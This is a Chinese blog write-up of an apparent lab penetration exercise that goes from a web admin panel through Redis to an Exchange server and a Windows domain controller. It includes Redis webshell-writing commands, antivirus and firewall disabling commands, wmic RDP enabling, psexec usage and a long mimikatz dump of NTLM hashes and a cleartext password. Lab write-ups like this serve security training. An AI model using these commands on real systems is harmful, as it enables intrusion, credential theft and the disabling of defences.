> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [mp.weixin.qq.com](https://mp.weixin.qq.com/s/V9yKi5wrlLV2GrPXjjYV6w)

            大概环境长这个样子 

由于 nat 环境问题 所有 192.168.59 这个段不一致

![](https://mmbiz.qpic.cn/mmbiz_png/7XAvvlbibo1TmTsRPicMUL6Ws4b05xEkHYF1X0CmFRmegqnXh7HOjhia1bvIECvUibREGfWnObrxex1YSCgK4lvA4Q/640?wx_fmt=png)

由于没有师傅们的审计能力 只能漏洞复现方式做了

扫描 web.rar 导入 sql 分析发现 这个是旧的 已经没有用了

![](https://mmbiz.qpic.cn/mmbiz_png/7XAvvlbibo1TmTsRPicMUL6Ws4b05xEkHYGu72iaP1KJKUbALjpWZsiaXuoN5f76drDl3sqm8CyypiamW6mXNUI9G5Q/640?wx_fmt=png)

2 这个数据库备份的功能 也被暗月砍掉了 十分感谢暗月

![](https://mmbiz.qpic.cn/mmbiz_png/7XAvvlbibo1TmTsRPicMUL6Ws4b05xEkHYJIyc6FIVUOGHA4bI3Lt3EhfZUslRBsdT5AzbIMMUQ4FLlnfJA9hibvA/640?wx_fmt=png)

3 师傅们给的另一招 下载数据库备份文件

http://www.cocat.cc/kss_admin/admin_data.php

?action=mysqldatabak_down&pwd= 安全密码

直接 notepay++ 搜全局安全密码

![](https://mmbiz.qpic.cn/mmbiz_png/7XAvvlbibo1TmTsRPicMUL6Ws4b05xEkHYqBzylcsncagdzJIJWod3RJicjaoU7Fk0GJ6MyzibiczK47PlStqePLBKg/640?wx_fmt=png)

下载备份数据库文件 导入 解密

登录后台 怀疑就是暗月给砍掉了

![](https://mmbiz.qpic.cn/mmbiz_png/7XAvvlbibo1TmTsRPicMUL6Ws4b05xEkHYlrX2ia6wxH2lMYfDicKX7xdFxyGWQdSl6dsTDjswoWhP39hE3emd6icgg/640?wx_fmt=png)

这个地方闭合

![](https://mmbiz.qpic.cn/mmbiz_png/7XAvvlbibo1TmTsRPicMUL6Ws4b05xEkHYiaiclDsFbe3q3dKh8B2Qv3Y3JrJesb8vVibOwibLHGnwEOk7bJhwrwGYuw/640?wx_fmt=png)

路径 默认配置文件

![](https://mmbiz.qpic.cn/mmbiz_png/7XAvvlbibo1TmTsRPicMUL6Ws4b05xEkHYlYDUX1hP5cEfjPzQL5bmUX2uliahWDNdh6mCob6Lds6Gyqo0bGI204A/640?wx_fmt=png)

Db 文件解密

![](https://mmbiz.qpic.cn/mmbiz_png/7XAvvlbibo1TmTsRPicMUL6Ws4b05xEkHYL1wjjicsNCYcrrLE3gf1LSNPgpKqeJhQz7EuXSlJssFFw08xDKeUL9w/640?wx_fmt=png)

宝塔默认端口 8888

http:// 域名: 8888/soft

![](https://mmbiz.qpic.cn/mmbiz_png/7XAvvlbibo1TmTsRPicMUL6Ws4b05xEkHYVCpEEnCRJ2ric5yaFDPAX5gPZnM41zSlomWP7KkHkFFAhJUp1lwHspg/640?wx_fmt=png)

然后解封函数即可

![](https://mmbiz.qpic.cn/mmbiz_png/7XAvvlbibo1TmTsRPicMUL6Ws4b05xEkHYPRhwjcP1j5wyNibkRWuyTgmiaSMnAPp60Btaic5wz4TFuKuskuEIPibGvw/640?wx_fmt=png)

然后上 frp 映射端口

![](https://mmbiz.qpic.cn/mmbiz_png/7XAvvlbibo1TmTsRPicMUL6Ws4b05xEkHY15gxNYiaLgcB95eIXkChR3Gv1tocicID2ibTFib7kGRvaU0jqyrxJfS0RQ/640?wx_fmt=png)

通过 phpinfo 查看网站的内网 ip

![](https://mmbiz.qpic.cn/mmbiz_png/7XAvvlbibo1TmTsRPicMUL6Ws4b05xEkHY3uscsHib3D0fg59UiavNxMKORiaHPIgtT2sCZCyibzcFJKl6TXR9HFvEYg/640?wx_fmt=png)

现在的情况  那就抓 hash

![](https://mmbiz.qpic.cn/mmbiz_png/7XAvvlbibo1TmTsRPicMUL6Ws4b05xEkHYd1Kq2kEiaibro4UCPy8TM8uCo2Fiag0CFQX987QtsmS6V2dnXIwHhia1sg/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/7XAvvlbibo1TmTsRPicMUL6Ws4b05xEkHYlayq4riclSNTfphmEsSHAAbo1QtTz7rIgmUpammrIPyN9o1G3TzEibBQ/640?wx_fmt=png)

等等上去关火绒

![](https://mmbiz.qpic.cn/mmbiz_png/7XAvvlbibo1TmTsRPicMUL6Ws4b05xEkHY1viaGvI3JV2wRVUcFhrq6qYI5OP6Wgfiaky8oGzlCG27af3XibbcejJHg/640?wx_fmt=png)

Frp 将内网 3389 穿透出去关闭火绒

![](https://mmbiz.qpic.cn/mmbiz_png/7XAvvlbibo1TmTsRPicMUL6Ws4b05xEkHYzfbrDRQ9e4mHnc6HGlvKsB85VCorlO2TrHkwiciaajUkU4SoGN1Z3HYA/640?wx_fmt=png)

上马 hashdump 迁移进程 梭哈

![](https://mmbiz.qpic.cn/mmbiz_png/7XAvvlbibo1TmTsRPicMUL6Ws4b05xEkHYvcqMX4GS5vAAGJ8VJfphPuP0BHv6sAw2VeeUibZ3pIwY0cS6ia21hXCg/640?wx_fmt=png)

redis 已经拿下 通过爆破密码

然后通过把 cmd 与 redis-cli 导入

![](https://mmbiz.qpic.cn/mmbiz_png/7XAvvlbibo1TmTsRPicMUL6Ws4b05xEkHYZOHcYoQZ4qExHYkib4wgodFJoKfCjfbh5CQjpRw4GaHHNqOhiaXyBQBw/640?wx_fmt=png)

坑点 1 写入 php 提示 404 但是写入了

2 写入 webshell 要单引号

3 两个程序都需要导入代理 cmd 与 rediscli

![](https://mmbiz.qpic.cn/mmbiz_png/7XAvvlbibo1TmTsRPicMUL6Ws4b05xEkHYVYnjePo6ofPZCVibaMMWtdxmrsS0Wpo6BW9IPQHphSFKZBcCPyBXKjQ/640?wx_fmt=png)

config set dir/home/wwwroot/default/ #windows 的 web 默认路径

config setdbfilename redis.php    文件名字

set webshell"<?php phpinfo(); ?>"  #webshell

save

      php 可以双引号 不知道为什么这个 asp 就得单引号了记录一下

第二个机器 上图用 redis 打穿了 通过代理 蚁剑连接   

然后配上甜土豆提权 关闭防火墙

![](https://mmbiz.qpic.cn/mmbiz_png/7XAvvlbibo1TmTsRPicMUL6Ws4b05xEkHYbnYCCia5HsTahTO78ciaLhlpoTBf2SkBQDup2UUMCPAnKkgcuZlBpGVA/640?wx_fmt=png)

甜土豆坑点 1 此版本的甜土豆如果提权需要加入绝对路径

 例如 1.exe -a "c:/windows/*.exe"  

然后加路由扫内网

![](https://mmbiz.qpic.cn/mmbiz_png/7XAvvlbibo1TmTsRPicMUL6Ws4b05xEkHYiaFaC41ibeqr14uxqMP3RxmrzU6k09gqRGS4dgRxHLvOEKibjiaPc3NXPA/640?wx_fmt=png)

本机 ip 202

![](https://mmbiz.qpic.cn/mmbiz_png/7XAvvlbibo1TmTsRPicMUL6Ws4b05xEkHYldRjLGYEN8WO5FWjqDCKL7k0cqBcaG0xCcbNlh1w1sZolClOWpsiblA/640?wx_fmt=png)

一共三个存活 那就是 201 开始测试

扫描 ip 端口

nmap -sV -sC  -sT -Pn -p- 10.10.10.201  过程巨慢可以去打个 lol 什么的

nmap -sV -sC  -sT -Pn -p- 10.10.10.209

201

然后出来了 域控的机器 还有域控的域名

![](https://mmbiz.qpic.cn/mmbiz_png/7XAvvlbibo1TmTsRPicMUL6Ws4b05xEkHYgdfSxIFDia0nuWibSChbSsHsnjKniaTHzsHRwKwJMPpM8xQZZGTicjTyrw/640?wx_fmt=png)

209

开启了 80 443

生成正向连接 exe 坑点 记得不要带空格

![](https://mmbiz.qpic.cn/mmbiz_png/7XAvvlbibo1TmTsRPicMUL6Ws4b05xEkHYkqXnW6yshFRKduIdvy1OkXkdOkDfOTyeiabGKuAfDHD6cxYKLKW7Bgg/640?wx_fmt=png)

然后传入 redis 服务器的 http 页面

![](https://mmbiz.qpic.cn/mmbiz_png/7XAvvlbibo1TmTsRPicMUL6Ws4b05xEkHYwNA8kiaOygZXGchyakkbcBchgniaoKNUBV2MTicx72Ggsc4Pia6B8t5XPg/640?wx_fmt=png)

代理访问 为 outlook 邮箱 翻 exp 去

坑点 如果是乱码 用 * 可以正则匹配一下下

 获得邮箱 moonsec@cncat.cc

test@cncat.cc

![](https://mmbiz.qpic.cn/mmbiz_png/7XAvvlbibo1TmTsRPicMUL6Ws4b05xEkHYM1wticAYFYKrcROHAcLZyYzTeFmOcsXEAOxBrOolricnEUNESY8OP1PA/640?wx_fmt=png)

 用那个 outbook 邮箱漏洞来打

这个 -i whoami 没什么用。。。直接就是交互式的命令执行

wmic RDTOGGLE WHEREServer call SetAllowTSConnections 1

![](https://mmbiz.qpic.cn/mmbiz_png/7XAvvlbibo1TmTsRPicMUL6Ws4b05xEkHYSno9BdGE0GVMdL6UVUgxDWNKicw5nu42AUllPpYQh05ES7qaBtDexkA/640?wx_fmt=png)

关闭防火墙

下载我们刚刚给 redis 传的文件

![](https://mmbiz.qpic.cn/mmbiz_png/7XAvvlbibo1TmTsRPicMUL6Ws4b05xEkHY33TP61n4tekibBH3rn7CCR3805icLddiakuat4p9b64zYDv9PDicObxQuQ/640?wx_fmt=png)

然后执行命令

![](https://mmbiz.qpic.cn/mmbiz_png/7XAvvlbibo1TmTsRPicMUL6Ws4b05xEkHYomWGXURnD6SyBZI3S59cBL4AKPze71WBJbbqzySfXrudK5KgLtOmCg/640?wx_fmt=png)

此处为 migrate 了一个低权限进程 切记 x64 system 权限

![](https://mmbiz.qpic.cn/mmbiz_png/7XAvvlbibo1TmTsRPicMUL6Ws4b05xEkHYx83ia8FngmxmTw2UOZXqmibIjqsCDOj9vUY5uNqoyVKpZh0LYIAE7iaQA/640?wx_fmt=png)

Hashdump 为本机的密码 然后载入猕猴桃试试

![](https://mmbiz.qpic.cn/mmbiz_png/7XAvvlbibo1TmTsRPicMUL6Ws4b05xEkHYKWH5ZUGoXw6wNfAiaxrdW8DmibUlNEv8RxMnQaPxKpCTrvSPFEtEQalA/640?wx_fmt=png)

然后就是佳哥教的 抓密码了 msf 自带以后没有猕猴桃了

Load kiwi

kiwi_cmd -f sekurlsa::logonPasswords

Authentication Id : 0 ; 20871772(00000000:013e7a5c)

Session           : NetworkCleartext from 0

User Name         : HealthMailbox3f7d5b8

Domain            : CNCAT

Logon Server      : 12SERVER-DC

Logon Time        : 2021/6/17 16:18:33

SID               :S-1-5-21-296591627-685496165-1408683996-1131

       msv:     

        [00000003] Primary

        * Username : HealthMailbox3f7d5b8

        * Domain  : CNCAT

        * NTLM    : 3fd9fdd66292ffe77e16137d5649ea17

        * SHA1    : 3acc7e64b7b354a1a8a51206bca488d514055b3a

       tspkg:   

       wdigest:

        * Username : HealthMailbox3f7d5b8

        * Domain  : CNCAT

        * Password : (null)

       kerberos:     

        * Username : HealthMailbox3f7d5b8

        * Domain  : CNCAT.CC

        * Password : (null)

       ssp:

       credman:     

Authentication Id : 0 ; 20861945(00000000:013e53f9)

Session           : NetworkCleartext from 0

User Name         : HealthMailbox3f7d5b8

Domain            : CNCAT

Logon Server      : 12SERVER-DC

Logon Time        : 2021/6/17 16:18:22

SID               : S-1-5-21-296591627-685496165-1408683996-1131

       msv:     

        [00000003] Primary

        * Username : HealthMailbox3f7d5b8

        * Domain  : CNCAT

        * NTLM    : 3fd9fdd66292ffe77e16137d5649ea17

        * SHA1    : 3acc7e64b7b354a1a8a51206bca488d514055b3a

       tspkg:   

       wdigest:

        * Username : HealthMailbox3f7d5b8

        * Domain  : CNCAT

        * Password : (null)

       kerberos:     

        * Username : HealthMailbox3f7d5b8

        * Domain  : CNCAT.CC

        * Password : (null)

       ssp:

       credman:     

Authentication Id : 0 ; 13728747(00000000:00d17beb)

Session           : Interactive from 1

User Name         : administrator

Domain            : CNCAT

Logon Server      : 12SERVER-DC

Logon Time        : 2021/4/28 23:45:24

SID               :S-1-5-21-296591627-685496165-1408683996-500

       msv:     

        [00000003] Primary

        * Username : Administrator

        * Domain  : CNCAT

        * NTLM    : 42e2656ec24331269f82160ff5962387

        * SHA1    : 202a4f252fa716b16cc934c114a2b4423add410d

        [00010000] CredentialKeys

        * NTLM    : 42e2656ec24331269f82160ff5962387

        * SHA1    : 202a4f252fa716b16cc934c114a2b4423add410d

       tspkg:   

       wdigest:

        * Username : Administrator

        * Domain  : CNCAT

        * Password : (null)

       kerberos:     

        * Username : administrator

        * Domain  : CNCAT.CC

        * Password : (null)

       ssp:

       credman:     

Authentication Id : 0 ; 86756(00000000:000152e4)

Session           : Interactive from 1

User Name         : DWM-1

Domain            : Window Manager

Logon Server      : (null)

Logon Time        : 2021/4/28 19:52:09

SID              : S-1-5-90-1

       msv:     

        [00000003] Primary

        * Username : 12SERVER-EX13$

        * Domain  : CNCAT

        * NTLM    : 7e0ebfdc16be2cf7652792713162d817

        * SHA1    : a413aeaf7935bab126af11ad8a1221651217e014

       tspkg:   

       wdigest:

        * Username : 12SERVER-EX13$

        * Domain  : CNCAT

        * Password : (null)

       kerberos:     

        * Username : 12SERVER-EX13$

        * Domain  : cncat.cc

        * Password : de 6b 04 cc 34 dc 30 d8 00 ec 9449 84 42 0b 33 7e ba 79 0e ac 56 99 64 ea 10 c8 95 95 55 a4 be 46 42 e6 5a 206e 58 f8 58 bc 35 56 6f ec ad 5a c6 b7 df 2f 1d dc 6c a0 c2 be ff 85 40 45 8d27 86 10 da 8b 48 8e c8 33 b2 23 9f 02 67 c4 06 61 33 1e f7 87 81 e4 0a bc 9158 63 b5 64 c5 27 53 1b a2 1e 1e 3c 4e bc e0 8b 1c 0c 03 60 08 bd 51 11 b6 7267 28 2c 9f e7 ee 1a fa bb 71 15 a6 a1 5d 2a 27 9f dd 11 22 b3 05 8e c3 03 8fc1 79 64 c0 d3 9f a4 93 c1 60 e7 4a 30 e4 fb c0 4b 43 da de 30 2c 9c 2e e8 93d1 1c 6b 3b eb a6 d7 a2 8e 51 f1 20 c9 50 95 e0 84 0d 64 f7 1b 73 11 0b fd bb0b 89 f1 e6 dc 8f e2 71 83 b0 16 42 f0 b7 29 3a c7 2e ae c8 5e c0 6e e8 96 dfa7 52 b8 f3 22 2d fd 9d 99 36 b3 d2 3e 7b e9 54 a5 ab 23 ce 4f

       ssp:

       credman:     

Authentication Id : 0 ; 996(00000000:000003e4)

Session           : Service from 0

User Name         : 12SERVER-EX13$

Domain            : CNCAT

Logon Server      : (null)

Logon Time        : 2021/4/28 19:52:09

SID               : S-1-5-20

       msv:     

        [00000003] Primary

        * Username : 12SERVER-EX13$

        * Domain  : CNCAT

        * NTLM    : 7e0ebfdc16be2cf7652792713162d817

        * SHA1    : a413aeaf7935bab126af11ad8a1221651217e014

       tspkg:   

       wdigest:

        * Username : 12SERVER-EX13$

        * Domain  : CNCAT

        * Password : (null)

       kerberos:     

        * Username : 12server-ex13$

        * Domain  : CNCAT.CC

        * Password : (null)

       ssp:

       credman:     

Authentication Id : 0 ; 20873779(00000000:013e8233)

Session           : NetworkCleartext from 0

User Name         : HealthMailbox3f7d5b8

Domain            : CNCAT

Logon Server      : 12SERVER-DC

Logon Time        : 2021/6/17 16:18:34

SID               :S-1-5-21-296591627-685496165-1408683996-1131

       msv:     

        [00000003] Primary

        * Username : HealthMailbox3f7d5b8

        * Domain  : CNCAT

        * NTLM    : 3fd9fdd66292ffe77e16137d5649ea17

        * SHA1    : 3acc7e64b7b354a1a8a51206bca488d514055b3a

       tspkg:   

       wdigest:

        * Username : HealthMailbox3f7d5b8

        * Domain  : CNCAT

        * Password : (null)

       kerberos:     

        * Username : HealthMailbox3f7d5b8

        * Domain  : CNCAT.CC

        * Password : (null)

       ssp:

       credman:     

Authentication Id : 0 ; 995(00000000:000003e3)

Session          : Service from 0

User Name         : IUSR

Domain            : NT AUTHORITY

Logon Server      : (null)

Logon Time        : 2021/4/28 19:52:16

SID               : S-1-5-17

       msv:     

       tspkg:   

       wdigest:

        * Username : (null)

        * Domain  : (null)

        * Password : (null)

       kerberos:     

       ssp:

       credman:     

Authentication Id : 0 ; 997(00000000:000003e5)

Session           : Service from 0

User Name         : LOCAL SERVICE

Domain            : NT AUTHORITY

Logon Server      : (null)

Logon Time        :2021/4/28 19:52:09

SID               : S-1-5-19

       msv:     

       tspkg:   

       wdigest:

        * Username : (null)

        * Domain  : (null)

        * Password : (null)

       kerberos:     

        * Username : (null)

        * Domain  : (null)

        * Password : (null)

       ssp:

       credman:     

Authentication Id : 0 ; 52997(00000000:0000cf05)

Session           : UndefinedLogonType from 0

User Name         : (null)

Domain            : (null)

Logon Server      : (null)

Logon Time        : 2021/4/28 19:52:06

SID               :

       msv:     

        [00000003] Primary

        * Username : 12SERVER-EX13$

        * Domain  : CNCAT

        * NTLM    : 7e0ebfdc16be2cf7652792713162d817

        * SHA1    : a413aeaf7935bab126af11ad8a1221651217e014

       tspkg:   

       wdigest:

       kerberos:     

       ssp:

        [00000000]

        * Username : HealthMailbox3f7d5b8296944b708823d775f3d09aef@cncat.cc

        * Domain  : (null)

        * Password :$9u-LyPp5[j.UeS!I!xb&dpQD5ynJi3*UE3gaMLrcB-UsErNKa+DX%5>@9)b@W.;Mww8ONUuWDxnRi1Q@CAaGCKID$5gY}#XRd%^@wXflBE+wUa==]zsJz%dG@7S+pVq

        [00000001]

        * Username : HealthMailbox3f7d5b8296944b708823d775f3d09aef@cncat.cc

        * Domain  : (null)

        * Password :$9u-LyPp5[j.UeS!I!xb&dpQD5ynJi3*UE3gaMLrcB-UsErNKa+DX%5>@9)b@W.;Mww8ONUuWDxnRi1Q@CAaGCKID$5gY}#XRd%^@wXflBE+wUa==]zsJz%dG@7S+pVq

       credman:     

Authentication Id : 0 ; 999(00000000:000003e7)

Session           : UndefinedLogonType from 0

User Name         : 12SERVER-EX13$

Domain            : CNCAT

Logon Server      : (null)

Logon Time        : 2021/4/28 19:52:06

SID               : S-1-5-18

       msv:     

       tspkg:   

       wdigest:

        * Username : 12SERVER-EX13$

        * Domain  : CNCAT

        * Password : (null)

       kerberos:     

        * Username : 12server-ex13$

        * Domain  : CNCAT.CC

        * Password : (null)

       ssp:

       credman:     

解密 hash

QWEasd123

此时已经基本上 ok 了 就差最后一台的的域控了

![](https://mmbiz.qpic.cn/mmbiz_png/7XAvvlbibo1TmTsRPicMUL6Ws4b05xEkHYG7191RiaSUQTicjoEhbHmaENMibw5sOyj4LGiaXydyzdP64mCYSQ2qfZiaQ/640?wx_fmt=png)

此时已经打穿三台了 域控的密码也有了

 此处大约卡了半个小时。。感谢佳哥的细心指导

Use windows/smb/psexec

![](https://mmbiz.qpic.cn/mmbiz_png/7XAvvlbibo1TmTsRPicMUL6Ws4b05xEkHYhfGwtzSN4jMb7252SnaqKC1hKuFibjVPQJIckOCMyKuovBwgIURo7VQ/640?wx_fmt=png)

初次设置 弹不回来 分析发现 关闭防火墙即可 弹回来 但是不能手动去关啊。。

然后佳哥教导

windows/x64/exec

set cmd netsh firewall set opmode disable

![](https://mmbiz.qpic.cn/mmbiz_png/7XAvvlbibo1TmTsRPicMUL6Ws4b05xEkHYeVnXhwbUd1ChrtdVGianibjCIUapyhmWrxWUZDgfeOW4mAuOmyr4oFYA/640?wx_fmt=png)

此条命令为关闭域防火墙

用这个关闭所有的防火墙

NetSh Advfirewall set allprofiles state off

![](https://mmbiz.qpic.cn/mmbiz_png/7XAvvlbibo1TmTsRPicMUL6Ws4b05xEkHY9u3f5K2UqpzliaDJNyFzwlcDVCvqyQVm8tHLst9c5oZzuiaoolI3Ktnw/640?wx_fmt=png)

然后反向连接

![](https://mmbiz.qpic.cn/mmbiz_png/7XAvvlbibo1TmTsRPicMUL6Ws4b05xEkHY6Zj0NDiaHib0VbicRu0cIbdvia8VuOMzPyrXWj8FmZH8TU2VGbgMyheX0Q/640?wx_fmt=png)

完事大吉

![](https://mmbiz.qpic.cn/mmbiz_png/7XAvvlbibo1TmTsRPicMUL6Ws4b05xEkHYY3yHzjibOetzt0CzkhQCAoqDwd9s9oOvG0GpagV1pqGicebj8oiay5VSw/640?wx_fmt=png)